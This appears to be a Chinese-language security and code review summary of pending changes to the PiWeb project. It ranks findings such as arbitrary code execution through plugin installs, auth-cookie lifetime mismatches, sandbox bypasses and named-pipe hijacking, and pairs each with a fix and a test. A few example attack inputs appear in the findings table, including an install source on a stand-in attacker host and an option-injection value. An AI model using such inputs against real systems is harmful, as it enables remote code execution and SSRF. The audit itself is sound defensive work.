# PiWeb 未提交变更审查总结（HEAD 1d4efba → 工作区）

日期：2026-11-14。范围：204 个已跟踪修改 + 169 个未跟踪新文件（排除 .audit-2026-11-13/、node_modules、package-lock）。方法：13 个分片审查员逐 hunk 审查（报告见本目录 rev-*.md），lead 对全部 CRITICAL/HIGH 逐条亲验（标注「已亲验」），静态分析、未运行代码。

## 裁定后计数

CRITICAL 1（原报 2，race 一条降级）· HIGH 24（原报 26，cmd& 降级 MEDIUM）· MEDIUM ~48 · QUESTION ~16

## CRITICAL

### [CRITICAL] src/app/api/plugins/route.ts:62（已亲验：route + service + SDK 三层）
**问题**：安装/更新插件 = 以服务器用户身份执行任意第三方代码。
**触发条件**：已认证 `POST /api/plugins {"action":"install","source":"npm:<任意包@版本|tarball URL|git URL|本地路径>"}`；`source` 仅限长 ≤4096。
**期望**：来源白名单 + 注册表钉扎 + integrity + 禁生命周期脚本。
**实际**：`installPackage`（plugins-service.ts:422）原样传 SDK；SDK `package-manager.js` 全文零 `--ignore-scripts`，pnpm 还显式 `--config.strict-dep-builds=false` 放开构建拦截；对比同仓库 `update-service.ts:184` 自更新带 `--ignore-scripts`。无来源白名单、不读 `dist.integrity`、失败无回滚（MEDIUM 关联）。
**修复**：安装入口只接受 `npm:合法包名@精确版本`（或预置白名单 git 主机 https）；传 `--ignore-scripts`；拒绝 `-` 开头 spec、URL、本地路径。
**测试**：仅含 postinstall 的包 POST 安装，断言标记文件被创建。

## HIGH（已亲验 10 条，全块格式）

### [HIGH] scripts/web-auth-protocol.mjs:16 + src/lib/web-auth-shared.ts:16
**问题**：Cookie 寿命双常量分裂，认证默认开启时**所有写请求 401**。
**触发**：任意刚签发的 30 天 Cookie 发 POST/PUT/PATCH/DELETE。
**期望**：守卫与签发同一寿命常量。**实际**：protocol 模块 7 天、shared 30 天；`http-request-guard.mjs:83,88` 对一切非 GET 强制验 Cookie，`validCookieValue:49` 拒 30 天跨度 → 401；proxy 侧按 30 天放行 GET。浏览能看、写全瘫。与 #211「未做真实浏览器验收」吻合。
**修复**：守卫改从 shared 导入（mjs 可复制常量但必须同值），加回归测试。**测试**：新签发 Cookie POST 1 字节，现状 401。

### [HIGH] src/lib/confined-file-operations.ts:57-60
**问题**：full 档/一次性 full 升权的写入完全绕过路径判定与沙箱。
**触发**：升权批准后 write 的目标含 junction 祖先或 MSYS 路径（如 `/c/...`）。
**实际**：`preset==="full"` 直接 `fs.writeFile/mkdir`，无 judgeWritePath/realpath/沙箱；升权经 widenPreset 进入该分支。批准卡只显示原始路径，用户无法识别 junction。**修复**：full 分支至少保留 realpath 归一与 junction 拒绝。**测试**：workspace 下建 junction 指向外部，full 升权写链接路径，断言外部文件未变。

### [HIGH] src/app/api/web-auth/route.ts:74（已亲验 pairing.ts）
**问题**：`DELETE ?scope=all` 不作废未兑换配对码。
**触发**：取得配对码 → 全设备登出 → 120 秒内 `GET /pair?code=…`。
**实际**：配对码纯内存（pairing.ts），与 revokeAllSessions/invalidateLaunchTokens 零交互；新 Cookie issuedAt > notBefore → 逃过全局登出。
**修复**：scope=all 时清空 pending 码；兑换时拒绝 issuedAt < notBefore 的码。
**测试**：签码→登出 all→同码兑换必须失败且无 Set-Cookie。

### [HIGH] src/instrumentation-node.ts:26-45（属文档化设计，需产品确认）
**问题**：生产启动默认绑 0.0.0.0 并自动拉 trycloudflare 公网隧道。
**触发**：默认配置启动（`PIWEB_REMOTE_LAN` 默认开）。
**实际**：supervisor.ts startLan 默认 host=0.0.0.0，随后 startPublic；`/api/health /login /pair /api/web-auth` 对未认证开放，随机 `*.trycloudflare.com` 泄露即成互联网认证面。
**修复**：LAN 与公网均改显式开关；隧道未就绪不把配对码嵌外链。

### [HIGH] src/lib/web-auth.ts:136-148 + src/lib/remote/pairing.ts
**问题**：局域网明文 HTTP 上兑换主人级凭据。
**触发**：隧道未 ready 时设置页发 `http://<ip>:30142/pair?code=…`；同网嗅探。
**实际**：LAN 直连下 Cookie 无 Secure；码可重放至兑换成功为止。
**修复**：无 TLS 不发码、不种 Cookie；码绑定 authority。

### [HIGH] src/lib/web-launch-token.ts:85-132 + scripts/web-auth-protocol.mjs:6-13（api+scripts 双分片独立发现）
**问题**：Windows 全局命名管道可被其他本地用户抢占，启动器把启动令牌写给未验明对端。
**触发**：多用户机器上，先占 `\\.\pipe\piweb-launch-<sha256(agentDir:port)>` 再触发启动器重开。
**实际**：管道无安全描述符参数；launchTokenIpcPath 管道名可预测。拿到令牌即可换主人 Cookie。
**修复**：管道创建时收紧 DACL（仅当前用户+SYSTEM）；连接时校验对端身份。

### [HIGH] src/app/api/skills/route.ts:32（已亲验 path-security.ts:79-92）
**问题**：技能 read/toggle 跟随已发现技能的符号链接读工作区外文件。
**触发**：扫描根内植入 SKILL.md → 外部文件的符号链接，POST action=read。
**实际**：`resolveDiscoveredPath` 用 realpath 对 realpath 比较——链接化的已发现技能天然合法，readSkillBounded 打开真实目标。
**修复**：发现/读取阶段 lstat 拒绝链接化技能文件（或只允许指向受管根内）。

### [HIGH] scripts/testing/check-skips.mjs:6-29（已亲验，计数修正）
**问题**：跳过白名单与实际测试标题脱节，ubuntu CI 确定性必红。
**触发**：ubuntu 跑 npm run check；sandbox 测试 skipIf 跳过的标题不在白名单。
**实际**（lead 实测 diff）：windows-acl 缺 2 条（"does not expose API keys…"、"stops forwarding output past the limit…"）+ 1 条失效旧标题（"bounds total pipe output and kills a noisy command"）；manager 缺 1 条（"awaits an already-started release…"）。unexpectedSkips 抛错。
**修复**：按当前标题更新白名单（或改用稳定 id）。

### [HIGH] tests/lib/sandbox/shell-selection.test.ts:13,50（已亲验）
**问题**：原生 bash→script 通道唯一测试硬编码 `D:\git\Git\bin\bash.exe`，所有 runner 永久 skip 且白名单放行（win32 分支 :50）→ Windows shell 选择零 CI 覆盖。
**修复**：runner 上探测常见安装路径或注入 fixture bash。

### [HIGH] src/lib/skills-service.ts:303（junction TOCTOU）与 :278（bind mount）——分片验证，机制成立
- 计划与删除之间祖先可被换成 junction（需本地写权限窗口）；
- 删除边界只认 `isSymbolicLink()`，Linux bind mount（st_dev 变化）不拦截。
**修复**：全程锁内 lstat 每级祖先拒绝 reparse point；dev 变化按挂载点处理。

## HIGH（分片验证，逐条一行）

| 位置 | 问题 |
|---|---|
| src/app/api/plugins/route.ts:62 | 安装源可 SSRF：`git:http://内网`、`npm:https://attacker/x.tgz`、`npm:--registry=…` 选项注入 |
| src/lib/plugins-service.ts:422 | npm 包名含 `..` 逃出 `npm/node_modules`（parseNpmSpec 不拒） |
| scripts/launcher.mjs:118 | 同命名管道条目（启动器侧视角） |
| scripts/launcher.mjs:407 | cmd start 打开 `--public-url`，`&` 未引用可注入——**降级 MEDIUM**：注入者只能是本机 CLI 调用者 |
| src/app/api/plugins/route.ts:62（runner） | 自动化 runner.ts:246 `/` 命令提前记 success、headless 被清、停止到不了子进程，提问空等 30 分钟 |
| src/lib/automations/store.ts:421 | 并发满/本任务在跑 >2 分钟，到期任务被记「离线错过」静默跳过 |
| src/lib/automations/store.ts:187 | 一条坏 task/run 拖死全部定时任务，需人工 salvage |
| src/lib/automations/store.ts:495/58 | claim 后 record 失败被吞（该档不再跑）；心跳 5 分钟误判+双进程同跑 |
| src/lib/automations/schedule.ts:231 | DST 回拨重复小时 cron 再排一次，同日两跑 |
| scripts/file-lock.mjs | wx 崩溃残留/半截 JSON/.recovery/pid 复用 → 永久占锁；回收者按旧 children unlink、父死子活挡不住第二把锁 |
| src/lib/agent-manager.ts（disposeSession/reopenManaged） | 不等旧会话 shutdown 就对同一 JSONL 再 open |
| src/lib/settings-write-lock.ts + jsonc-settings-storage | 两会话写 settings.json：lockSync ~180ms 放弃/proper-lockfile 过期 rmdir → 更新丢失或双写 |
| src/lib/sandbox/windows-acl.ts:333 | AppContainer 未删特权；宿主提升时只读 bash 可写工作区（未亲验，需 koffi 动态确认） |

## MEDIUM（要点，全量见分片报告）

- **race（降级）**：web-secret.ts:203 全局登出毫秒级窗口（cutoff 采样到令牌轮换之间），需已持当前启动令牌——原报 CRITICAL 不成立。
- **launcher.mjs:407**：cmd `&` 注入（本地调用者自伤）。
- **plugins**：安装失败不回滚（脚本副作用/安装树/settings 残留）；大小写不折叠误删共用链接。
- **api**：/api/skills 外读边界即「已发现」而非「受管根内」。
- **scripts/guard**：每请求同步 readFileSync 密钥+吊销表；`req.emit` 返回 false 不能截断超额 body（end 仍送达）；launcher:274 `PI_WEB_AUTH=0` 可绑非回环；启动令牌进 stdout/浏览器历史/磁盘明文。
- **remote**：DELETE scope=all 后 30 天 Cookie 与 7 天守卫矛盾已列 HIGH；`web-launch/<port>.token` Windows DACL 未证实（QUESTION）。
- **auto**：损坏记录整体不可用无修复入口、漏跑静默、无全局并发上限、manage_automation 滥用面。
- **core**：冷读会话全量驻留池 ≥10 分钟无上限；growth rev-list 8MiB 截断致大历史工作区永久停摆；retention 清扫不复核登记表；升权命令前缀两处拼接可能不一致（已亲验 SDK：常态匹配，仅 prefix 中途变更时分叉）。
- **ui1**：composer 本地态跨会话串场；侧栏搜索每击键全量请求；i18n 首帧闪变；4 处硬编码中文。
- **ui2**：409 永久循环；setKey 竞态假成功；/api/models 30s 超时误报；重命名 provider 丢密钥；deleteCustom 部分失败态；导入被语言切换 abort。
- **tests**：coverage 闸门排除 scripts/** 五个新生产模块；file-lock/atomic-file/web-devices/recoverable-remove/automations-schedule 关键分支零测试。
- **secrets**：自定义头按名字脱敏遗漏（X-Credential 明文回显，已亲验 models-service.ts:1452）；node_modules\.cache 快照残留真实格式 sk- 密钥（范围外，建议删缓存+核实轮换）。

## QUESTION（代表项）

evaluateToolCallGate 无上限重评递归；shutdownFromExtensionCommand void 无拒绝处理；ChatInput restoreQueued 未走 20 张/8MB 封顶；ProviderSetupModal 自定义 header 明文回显；Windows `~/.pi/agent` DACL 与管道 SDDL 未实测；CL/TE 冲突未实测；.gitignore 未列 web-secret 等（默认路径在仓库外，仅 PI_CODING_AGENT_DIR 指进仓库才失守）；instrumentation 默认公网暴露属有意设计待 owner 确认。

## 最高风险 3 项

1. **插件安装即任意代码执行**（CRITICAL）：无白名单、无 `--ignore-scripts`、无完整性，市场关键字只管展示不过安装。
2. **默认配置下所有写请求 401**（HIGH）：7 天/30 天常量分裂 + 守卫对一切非 GET 强制验 Cookie；发布线从未做真实浏览器验收。
3. **默认 0.0.0.0 + 自动公网隧道 + 明文配对**（HIGH）：机器身份的暴露面默认全开，README 已文档化但属产品级风险决策。

## 未追踪部分（诚实清单）

- rev-secrets：345 个文件仅做凭证/日志/浏览器存储三类模式扫描（零命中），未逐行深读。
- rev-tests：90 项未深读（28 项深读；73 个已跟踪测试改动约 28 个仅 diff 级浏览）。
- rev-core 12：usePiWeb SSE/快照内部、workspace 视图组件本体、session-retention-scheduler.ts 实际不存在（按 session-retention.ts 审）等。
- rev-ui1 6：usePiWeb SSE 内部、workspace 视图、MarkdownBlock/DiffView、client-fetch×EventSource 交互。
- rev-ui2 5：SkillsSection/PluginMarketplace/PluginsSection（归 plugins 分片）、update-service 本体（归 scripts 分片）。
- rev-plugins 7：npm tarball 内部、hosted-git-info、SettingsManager.save 分叉、市场展示后半。
- rev-auto 5、rev-race 6、rev-api 6、rev-remote 4（CL/TE、Windows DACL、改状态 GET、隧道子域熵）、rev-sandbox 5（多为 koffi 动态确认项）、rev-scripts 0。
- sweep：变更全集已核对无漏网（仅 proxy.ts / instrumentation-node.ts / 两份 README 漏出，均已补审）。

## 结论

**REQUEST_CHANGES**——CRITICAL 1 条（插件安装任意代码执行）+ 2 条发布阻断级 HIGH（写路径全 401、CI 确定性红）+ 默认公网暴露面，均须先修；「真实浏览器验收 + 干净安装启动」应成为发布闸门。

**最担心的风险**：认证边界与插件安装两套「默认全开」叠加——这台机器的完整身份，实际取决于 npm 上的陌生人和一个可被本地用户抢占的命名管道。
